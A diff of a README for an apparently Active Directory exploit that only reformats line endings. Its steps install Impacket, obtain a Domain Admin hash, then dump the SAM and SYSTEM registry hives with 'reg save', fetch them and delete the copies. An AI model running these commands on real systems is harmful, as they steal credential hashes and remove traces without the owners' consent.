@@ -6,16 +6,16 @@ To exploit, clear out any previous Impacket installs you have and install Impack
 
 `apt update  `
 
-`apt remove --purge impacket-scripts python3-impacket   `
-`apt autoremove     `
+`apt remove --purge impacket-scripts python3-impacket   `  
+`apt autoremove`  
 
-`git clone https://github.com/rthalley/dnspython.git     `
-`sudo python3 setup.py install    `
-`cd ..    `
-`git clone https://github.com/SecureAuthCorp/impacket.git    `
-`cd impacket    `
-`sudo python3 setup.py install    `
-`git clone    `
+`git clone https://github.com/rthalley/dnspython.git     `  
+`sudo python3 setup.py install    `  
+`cd ..    `  
+`git clone https://github.com/SecureAuthCorp/impacket.git    `  
+`cd impacket    `  
+`sudo python3 setup.py install    `  
+`git clone    `  
 
 Then, do:
 
@@ -32,9 +32,9 @@ which should get you Domain Admin hash. After you have that, wmiexec.py to the t
 
 and do
 
-`reg save HKLM\SYSTEM system.save\    
-get system.save\   
-del /f system.save\`   
+`reg save HKLM\SYSTEM system.save\`   
+`get system.save\  `
+`del /f system.save\`  
     
     
 `reg save HKLM\SAM sam.save`    
